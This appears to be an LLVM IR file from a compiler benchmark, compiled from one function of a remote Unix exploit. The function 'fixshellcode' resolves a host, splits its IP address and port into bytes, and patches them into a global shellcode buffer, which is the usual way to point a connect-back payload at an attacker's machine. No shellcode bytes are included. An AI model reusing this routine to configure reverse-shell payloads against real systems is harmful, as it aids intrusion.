; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22314.c_fixshellcode.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22314.c_fixshellcode.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i8*, i32 }

@.str = private unnamed_addr constant [33 x i8] c"Unable to resolve local address\0A\00", align 1
@code = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @fixshellcode(i8* %0, i16 zeroext %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca i64, align 8
  %6 = alloca [4 x i8], align 1
  %7 = alloca [4 x i8], align 1
  %8 = alloca [2 x i8], align 1
  %9 = alloca [2 x i8], align 1
  %10 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  %11 = load i8*, i8** %3, align 8
  %12 = call i64 @inet_addr(i8* %11)
  store i64 %12, i64* %5, align 8
  %13 = icmp eq i64 %12, -1
  br i1 %13, label %14, label %30

14:                                               ; preds = %2
  %15 = load i8*, i8** %3, align 8
  %16 = call %struct.hostent* @gethostbyname(i8* %15)
  store %struct.hostent* %16, %struct.hostent** %10, align 8
  %17 = icmp eq %struct.hostent* %16, null
  br i1 %17, label %18, label %21

18:                                               ; preds = %14
  %19 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0))
  %20 = call i32 @exit(i32 0) #3
  unreachable

21:                                               ; preds = %14
  %22 = bitcast i64* %5 to i8*
  %23 = load %struct.hostent*, %struct.hostent** %10, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 0
  %25 = load i8*, i8** %24, align 8
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 1
  %28 = load i32, i32* %27, align 8
  %29 = call i32 @memcpy(i8* %22, i8* %25, i32 %28)
  br label %30

30:                                               ; preds = %21, %2
  %31 = load i64, i64* %5, align 8
  %32 = lshr i64 %31, 24
  %33 = and i64 %32, 255
  %34 = trunc i64 %33 to i8
  %35 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 3
  store i8 %34, i8* %35, align 1
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = and i64 %37, 255
  %39 = trunc i64 %38 to i8
  %40 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 2
  store i8 %39, i8* %40, align 1
  %41 = load i64, i64* %5, align 8
  %42 = lshr i64 %41, 8
  %43 = and i64 %42, 255
  %44 = trunc i64 %43 to i8
  %45 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 1
  store i8 %44, i8* %45, align 1
  %46 = load i64, i64* %5, align 8
  %47 = and i64 %46, 255
  %48 = trunc i64 %47 to i8
  %49 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  store i8 %48, i8* %49, align 1
  %50 = load i16, i16* %4, align 2
  %51 = zext i16 %50 to i32
  %52 = ashr i32 %51, 8
  %53 = and i32 %52, 255
  %54 = trunc i32 %53 to i8
  %55 = getelementptr inbounds [2 x i8], [2 x i8]* %8, i64 0, i64 0
  store i8 %54, i8* %55, align 1
  %56 = load i16, i16* %4, align 2
  %57 = zext i16 %56 to i32
  %58 = and i32 %57, 255
  %59 = trunc i32 %58 to i8
  %60 = getelementptr inbounds [2 x i8], [2 x i8]* %8, i64 0, i64 1
  store i8 %59, i8* %60, align 1
  %61 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %62 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %63 = call i32 @findvalmask(i8* %61, i8* %62, i32 4)
  %64 = getelementptr inbounds [2 x i8], [2 x i8]* %8, i64 0, i64 0
  %65 = getelementptr inbounds [2 x i8], [2 x i8]* %9, i64 0, i64 0
  %66 = call i32 @findvalmask(i8* %64, i8* %65, i32 2)
  %67 = load i8*, i8** @code, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 33
  %69 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %70 = call i32 @memcpy(i8* %68, i8* %69, i32 4)
  %71 = load i8*, i8** @code, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 38
  %73 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %74 = call i32 @memcpy(i8* %72, i8* %73, i32 4)
  %75 = load i8*, i8** @code, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 48
  %77 = getelementptr inbounds [2 x i8], [2 x i8]* %8, i64 0, i64 0
  %78 = call i32 @memcpy(i8* %76, i8* %77, i32 2)
  %79 = load i8*, i8** @code, align 8
  %80 = getelementptr inbounds i8, i8* %79, i64 53
  %81 = getelementptr inbounds [2 x i8], [2 x i8]* %9, i64 0, i64 0
  %82 = call i32 @memcpy(i8* %80, i8* %81, i32 2)
  ret void
}

declare dso_local i64 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @findvalmask(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
